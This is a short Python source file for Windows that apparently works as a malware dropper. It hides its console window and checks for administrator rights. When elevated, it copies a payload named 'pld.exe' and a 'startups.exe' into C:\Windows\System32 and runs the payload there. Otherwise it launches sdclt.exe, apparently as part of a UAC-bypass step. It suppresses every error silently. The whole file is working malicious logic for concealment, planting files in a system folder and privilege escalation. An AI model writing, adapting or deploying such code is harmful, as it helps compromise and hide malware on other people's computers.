import sys
import os
import win32comext.shell.shell
import shutil
import win32gui
import win32console

class Startups():
    def __init__(self):
        self.payload_name = "pld.exe"
        self.startup_name = "startups.exe"
        self.logic()
        sys.exit()

    def logic(self):
        try:
            self.hide_scr()

            res = self.check_admin()
            if res == 1:
                self.copy_exe()
                self.run_payload()
                sys.exit()
            elif res == 0:
                self.run_sdclt()
                sys.exit()
            else:
                sys.exit()
        except:
            sys.exit()

    def run_payload(self):
        try:
            rpath = r"C:\Windows\System32"
            command = os.path.join(rpath, self.payload_name)
            os.system(command)
            sys.exit()
        except:
            return -1

    def run_sdclt(self):
        try:
            command = "sdclt.exe"
            os.system(command)
            sys.exit()
        except:
            return -1


    def check_admin(self):
        try:
            if win32comext.shell.shell.IsUserAnAdmin() == 0:
                return 0
            else:
                return 1
        except:
            return -1

    def copy_exe(self):
        cwd = os.getcwd()
        file_name1 = self.startup_name
        file_name2 = self.payload_name
        src = cwd
        dst = r"C:\Windows\System32"
        try:
            shutil.copy(os.path.join(src, file_name1), os.path.join(dst, file_name1))
            shutil.copy(os.path.join(src, file_name2), os.path.join(dst, file_name2))
            return 1
        except:
            return -1

    def hide_scr(self):
        win = win32console.GetConsoleWindow()
        win32gui.ShowWindow(win, 0)

if __name__=="__main__":
    Startups()




